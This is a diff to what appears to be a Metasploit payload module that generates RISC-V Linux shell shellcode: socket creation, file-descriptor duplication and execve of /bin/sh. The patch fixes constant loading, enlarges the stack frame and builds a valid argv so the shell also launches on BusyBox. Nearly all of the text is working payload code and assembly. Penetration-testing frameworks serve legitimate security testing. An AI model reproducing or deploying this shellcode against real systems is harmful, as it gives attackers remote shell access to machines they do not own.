@@ -4,7 +4,7 @@
 ##
 
 module MetasploitModule
-  CachedSize = 140
+  CachedSize = 160
 
   include Msf::Payload::Single
   include Msf::Payload::Linux
@@ -71,8 +71,19 @@ module MetasploitModule
     (funct7 << 25) | (rs2 << 20) | (rs1 << 15) | (funct3 << 12) | (rd << 7) | opcode
   end
 
-  # Emit RISC-V instruction words that build an arbitrary 64-bit constant in a chosen register using SLLI+LUI+ADDI
-  # Note: modifies x6 register
+  # Encode a RISC-V SRLI (Shift Right Logical Immediate) instruction
+  def encode_srli(rd, rs1, shamt)
+    opcode = 0b0010011
+    funct3 = 0b101
+    funct6 = 0b000000
+    ((funct6 & 0x3f) << 26) | ((shamt & 0x3f) << 20) |
+      (rs1 << 15) | (funct3 << 12) | (rd << 7) | opcode
+  end
+
+  # Emit RISC-V instruction words that build an arbitrary 64-bit constant in a chosen register.
+  # Note: modifies x6 (t1) register.
+  # Uses slli+srli to zero-extend the low half so that sign-extended bits from
+  # load_const_into_reg32 do not corrupt the high half after the OR.
   def load_const_into_reg64(const, rd)
     raise ArgumentError, "Constant '#{const}' is #{const.class}; not Integer" unless const.is_a?(Integer)
 
@@ -80,16 +91,16 @@ module MetasploitModule
 
     raise ArgumentError, "Constant #{const} is outside range 0..#{max_const}" unless const.between?(0, max_const)
 
-    # Split into 32‑bit halves
     hi = const >> 32
     lo = const & 0xFFFF_FFFF
 
-    # Load high half
     [
       *load_const_into_reg32(hi, rd),
-      *encode_slli(rd, rd, 32),
+      encode_slli(rd, rd, 32),
       *load_const_into_reg32(lo, 6),
-      *encode_or(rd, rd, 6),
+      encode_slli(6, 6, 32), # zero-extend lo: clear upper bits from sign extension
+      encode_srli(6, 6, 32),
+      encode_or(rd, rd, 6),
     ]
   end
 
@@ -125,7 +136,7 @@ module MetasploitModule
 
     shellcode = [
       # prepare stack
-      0xff010113, # addi sp,sp,-16
+      0xfe010113, # addi sp,sp,-32
 
       # s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
       *load_const_into_reg32(SYS_SOCKET, 17),       # li a7,198  # SYS_socket
@@ -153,7 +164,8 @@ module MetasploitModule
       0x00000073,                                   # ecall
       0xfe0598e3,                                   # bnez a1,100c8 <c_dup>
 
-      # execve("/bin/sh", NULL, NULL);
+      # execve("/bin/sh", ["/bin/sh", NULL], NULL);
+      # BusyBox uses argv[0] to select its applet; NULL argv causes "applet not found".
       *load_const_into_reg32(SYS_EXECVE, 17),       # SYS_execve
       0x34399537,                                   # lui a0,0x34399
       0x7b75051b,                                   # addiw a0,a0,1975
@@ -161,8 +173,11 @@ module MetasploitModule
       0x34b50513,                                   # addi a0,a0,843
       0x00d51513,                                   # slli a0,a0,0xd
       0x22f50513,                                   # addi a0,a0,559
-      0x00a13023,                                   # sd a0,0(sp)
-      0x00010513,                                   # mv a0,sp
+      0x00a13023,                                   # sd a0,0(sp)      # sp[0..7] = "/bin/sh\0"
+      0x00010513,                                   # mv a0,sp          # a0 = path
+      0x00213423,                                   # sd sp,8(sp)       # argv[0] = &path
+      0x00013823,                                   # sd zero,16(sp)    # argv[1] = NULL
+      0x00810593,                                   # addi a1,sp,8      # a1 = argv
       0x00000073                                    # ecall
     ].pack('V*')
 
